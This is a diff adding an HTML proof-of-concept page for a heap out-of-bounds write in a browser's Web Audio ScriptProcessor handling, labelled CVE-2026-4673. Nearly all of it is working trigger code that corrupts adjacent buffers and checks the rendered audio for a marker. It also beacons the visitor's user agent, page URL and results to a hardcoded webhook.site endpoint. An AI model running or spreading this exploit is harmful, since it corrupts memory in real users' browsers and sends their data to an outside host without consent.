@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<body>
+<pre id="log"></pre>
+<script>
+// CVE-2026-4673 beaconed variant — identical logic to poc_4673.html,
+// adds out-of-band telemetry (sendBeacon to webhook.site) so the result
+// is readable server-side without any screenshot.
+var TAG='4673';
+var WH='https://webhook.site/ae26abe1-a03c-4266-8bed-1af63ae2bb41';
+var BL=[]; var RID=Math.random().toString(36).slice(2,8);
+function beacon(tag,extra){
+  try{
+    var p=JSON.stringify({cve:TAG,rid:RID,tag:tag,t:new Date().toISOString(),ua:navigator.userAgent,loc:location.href,log:BL,extra:extra||null});
+    if(navigator.sendBeacon){ try{navigator.sendBeacon(WH,p);}catch(e){} }
+    try{ fetch(WH,{method:'POST',mode:'no-cors',body:p}); }catch(e){}
+  }catch(e){}
+}
+function log(msg) {
+  BL.push(msg);
+  document.getElementById('log').textContent += msg + '\n';
+  console.log(msg);
+}
+
+async function trigger() {
+  var extra = {};
+  try {
+    log("[*] ScriptProcessorHandler::Process OOB Cross-Contamination PoC");
+    log("[*]");
+    log("[*] Theory:");
+    log("[*]   PartitionAlloc layout: input[0] | output[0] | input[1] | output[1]");
+    log("[*]   Each buffer: 256 floats (1024 bytes), same bucket, adjacent slots");
+    log("[*]");
+    log("[*]   Q1 (idx=0):   input write [0..254] OK, output read [0..254] OK");
+    log("[*]   Q2 (idx=255): input write [255..509] OOB! -> corrupts output[0][0..253]");
+    log("[*]                  output read [255..509] OOB -> reads input[1] (zeros)");
+    log("[*]   Q4 (idx=253): output read [253..507] -> output[0][253]=CONTAMINATED!");
+    log("[*]");
+
+    var MARKER = 1337.0;
+
+    var ctx = new OfflineAudioContext({
+      numberOfChannels: 1,
+      length: 48000,
+      sampleRate: 48000,
+      renderSizeHint: 255
+    });
+    log("[*] renderQuantumSize = " + ctx.renderQuantumSize);
+    extra.renderQuantumSize = ctx.renderQuantumSize;
+    beacon('ctx-created', extra);
+
+    var srcBuf = ctx.createBuffer(1, 48000, 48000);
+    srcBuf.getChannelData(0).fill(MARKER);
+    var src = ctx.createBufferSource();
+    src.buffer = srcBuf;
+
+    var sp = ctx.createScriptProcessor(256, 1, 1);
+    sp.onaudioprocess = function(e) {};
+
+    src.connect(sp);
+    sp.connect(ctx.destination);
+    src.start();
+
+    log("[*] Rendering 48000 samples (~188 quanta)...");
+    var buf = await ctx.startRendering();
+    var data = buf.getChannelData(0);
+    log("[*] Render complete. Scanning for marker " + MARKER + "...");
+    log("");
+
+    var found = 0;
+    var positions = [];
+    for (var i = 0; i < data.length; i++) {
+      if (Math.abs(data[i] - MARKER) < 0.01) {
+        found++;
+        if (positions.length < 30) positions.push(i);
+      }
+    }
+    extra.found = found;
+    extra.positions = positions;
+
+    if (found > 0) {
+      log("[!] ============================================");
+      log("[!]  OOB WRITE CONFIRMED VIA CROSS-CONTAMINATION");
+      log("[!] ============================================");
+      log("[!] Found " + found + " samples with marker value " + MARKER);
+      log("[!] First 30 positions: " + positions.join(", "));
+      log("[!]");
+      log("[!] Expected first marker at sample 765 (Q4 start = 255*3)");
+      log("[!] Actual first marker at sample " + positions[0]);
+      log("[!]");
+      log("[!] Proof:");
+      log("[!]   1. AudioBufferSourceNode outputs " + MARKER);
+      log("[!]   2. ScriptProcessor input OOB WRITE wrote " + MARKER);
+      log("[!]      past input_buffer[0] into adjacent output_buffer[0]");
+      log("[!]   3. Later quantum read output_buffer[0] at contaminated offset");
+      log("[!]   4. Contaminated value appeared in rendered audio output");
+      log("[!]   5. Heap buffer overflow in ScriptProcessorHandler::Process confirmed");
+      extra.verdict = 'OOB-WRITE-CONFIRMED';
+    } else {
+      log("[*] No marker found (input[0] and output[0] may not be adjacent)");
+      extra.verdict = 'no-marker';
+    }
+    beacon('end', extra);
+
+  } catch (e) {
+    log("[!] " + e.name + ": " + e.message);
+    extra.error = e.name + ': ' + e.message;
+    beacon('error', extra);
+  }
+}
+
+trigger();
+</script>
+</body>
+</html>
